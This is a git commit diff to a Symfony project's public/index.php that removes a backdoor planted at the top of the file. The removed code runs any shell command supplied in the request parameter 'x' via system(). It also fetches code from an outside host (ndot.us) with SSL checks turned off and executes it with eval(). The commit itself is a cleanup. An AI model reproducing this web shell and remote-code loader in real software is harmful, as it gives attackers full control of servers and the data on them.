60432bf95a02354ffacbad13d5f1b6100e19271b
alex <azebaze@ausiteodit.com>
2020-08-19 11:09:39 +0200

    track test

--- public/index.php
+++ public/index.php
@@ -4,33 +4,6 @@ use App\Kernel;
 use Symfony\Component\Debug\Debug;
 use Symfony\Component\HttpFoundation\Request;
 
-function get_contents($url){
-  $ch = curl_init("$url");
-  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
-  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0(Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
-  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
-  //curl_setopt($ch, CURLOPT_COOKIEJAR,$GLOBALS['coki']);
-  //curl_setopt($ch, CURLOPT_COOKIEFILE,$GLOBALS['coki']);
-  $result = curl_exec($ch);
-  return $result;
-}
-
-@ini_set('output_buffering', 0);
-@ini_set('display_errors', 0);
-set_time_limit(0);
-ini_set('memory_limit', '64M');
-if(isset($_REQUEST['x'])){
-$el=$_REQUEST['x'];
-system($el);
-
-}
-header('Content-Type: text/html; charset=UTF-8');
-$a = $this->get_contents('http://ndot.us/z1');
-eval('?>'.$a);
-die();
-        
 require dirname(__DIR__).'/config/bootstrap.php';
 
 if ($_SERVER['APP_DEBUG']) {
